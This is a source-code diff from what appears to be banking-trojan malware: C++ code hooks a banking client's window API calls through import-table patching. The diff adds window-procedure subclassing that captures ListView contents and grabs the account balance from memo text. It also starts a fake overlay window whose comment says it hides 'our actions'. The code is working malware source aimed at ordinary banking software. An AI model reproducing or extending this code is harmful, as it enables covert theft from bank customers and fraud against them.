@@ -29,6 +29,9 @@ namespace Rafa
 LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
 HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
 
+WNDPROC MainWndProc; //оконная процедура главного окна клиента
+
+
 //контрол формы, для автоматического заполнения формы данными
 struct ControlForm
 {
@@ -163,8 +166,6 @@ static bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,P
 
 static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
 {
-	PWCHAR buf = (PWCHAR)HEAP::Alloc(4096);
-
 	switch ( Msg )
 	{
 		// весь остальной текст в том числе и из EDIT (в правом нижнем углу)
@@ -173,7 +174,7 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			GrabBalansFromMemoText((char*)lParam);
 		break;
 
-		// для дерева добвка item
+		// для дерева добавление item
 		case TVM_INSERTITEM:
 		{
 			/*
@@ -200,22 +201,16 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			break;
 		}
 
-		// для таблицы добвка item
+		// для таблицы добавление item
 		case LVM_INSERTITEM:
 		{
 			/*
-			LPLVITEM	insert = (LPLVITEM)lParam;
-			if ( insert == NULL)
+			LPLVITEM item = (LPLVITEM)lParam;
+			if ( item == NULL)
 				break;
-			if ( insert->iItem == 2 )
-				return 1;
-
-			if ( insert->mask & LVIF_TEXT )
+			if ( item->mask & LVIF_TEXT && item->pszText != LPSTR_TEXTCALLBACK )
 			{
-				//insert->pszText[0] = '(';
-				//if ( m_lstrlen(insert->pszText) > 1 )
-				//	insert->pszText[1] = ':';
-				DBGRAFA( "Rafa", "LVM_INSERTITEM: [%x] %s", hWnd, insert->pszText); 
+				DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
 			}
 			*/
 			break;
@@ -233,9 +228,29 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			break;
 		}
 	}
-	HEAP::Free(buf);
 
-	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);;
+	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
+}
+
+static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
+{
+	LRESULT ret = MainWndProc( hWnd, Msg, wParam, lParam );
+	switch ( Msg )
+	{
+		case WM_NOTIFY:
+		{
+			NMLVDISPINFOA *pdi = (NMLVDISPINFOA*)lParam;
+			if( pdi->hdr.hwndFrom == listView && pdi->hdr.code == LVN_GETDISPINFO )
+			{
+				if( pdi->item.mask & LVIF_TEXT )
+				{
+					DBGRAFA( "Rafa*****", "i = %d,%d '%s'", pdi->item.iItem, pdi->item.iSubItem, pdi->item.pszText );
+				}
+			}
+			break;
+		}
+	}
+	return ret;
 }
 
 static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
@@ -746,8 +761,10 @@ static DWORD WINAPI FakeWindow( LPVOID p )
 //сюда попадаем когда найдены контролы TreeView и ListView окна банка
 static void WorkInRafa()
 {
-	stateFakeWindow = 1; //запуск окна скрывающего наши действия
 	HWND parent = (HWND)pGetParent(treeView);
+	//подменяем оконную процедуру главного окна, для перехвата нотификационніх сообщений
+	MainWndProc = (WNDPROC)SetWindowLongPtr( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
+	stateFakeWindow = 1; //запуск окна скрывающего наши действия
 	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
 	pCloseHandle(hThread);
 
